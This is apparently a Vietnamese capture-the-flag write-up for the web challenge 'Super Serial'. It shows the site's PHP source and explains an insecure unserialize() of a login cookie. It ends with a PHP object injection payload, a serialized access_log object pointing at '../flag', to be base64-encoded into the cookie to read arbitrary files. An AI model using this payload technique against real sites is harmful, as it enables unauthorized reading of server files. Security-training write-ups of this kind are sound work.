Super Serial
===
**Category:** Web

**Author:** MADSTACKS
### Description
Try to recover the flag stored on this website

### Overview
- Đầu tiên khi nào site chúng ta thấy một form login và ở phần mã nguồn và cookie không có gì đặc biệt hay cung cấp cho chúng ta manh mối gì

### Solution
- Mình thử dùng `dirsearch` để scan ra các path ấn của chương trình thì thấy được có `robots.txt`.
- Truy cập robots.txt ta nhận được `Disallow: /admin.phps` vì vậy mình thử truy cập `/admin.phps` thì 404 not found. Tiếp tục mình thử `index.phps` thì ta nhận được source của index
```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
Đọc qua code trên thì chúng ta thấy có 2 file khác là `cookie.php` và `authentication.php` vì vậy chúng ta tiếp tục lấy 2 file đó
File cookie.php
```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```
File authentication.php
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```
Phân tích 3 đoạn code trên ta thấy ở file `index.php` nhận vào 2 giá trị cho tham số `username` và `password` sau đó gọi class `permissions` với 2 tham số đó. Khi vào class `permissions` của file `cookie.php` thì nó có nhiệm vụ là check xem 2 tham số chúng ta truyền vào là `is_admin` hay `is_guest` và lưu vào biến `perm` là admin hoặc guest. Ở file index.php tiếp tục có hàm if để kiểm tra, chỉ cần là is_admin hay is_guest thì chương trình tiếp tục sẽ xét cookie có name là `login` với value là `urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"` tiếp tục redirect tới `authentication.php`. Ờ file `authentication.php` nó có nhiệm vụ kiểm tra biến `perm` đã lưu ở file cookie.php nếu là `admin` thì in ra `Welcome admin` và đọc file `access.log` còn không sẽ in ra `Welcome guest`.
- Chúng ta chú ý ở file `authentication.php` có magic function là `to_String` và nó return về hàm `read_log` mà hàm này đọc file từ biến `$log_file`. Mà biến này chúng ta có thể control nó. Chú ý ở file `cookie.php` khi set cookie có name là value thì nó `unserialize` vì vậy chúng ta có thể lợi dụng điều này để tấn công `PHP Object Injection`.

##### Payload
- `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
- Base64 payload trên và sửa giá trị của cookie `login` bằng chuỗi base64 đó.
- Request tới `authentication.php`
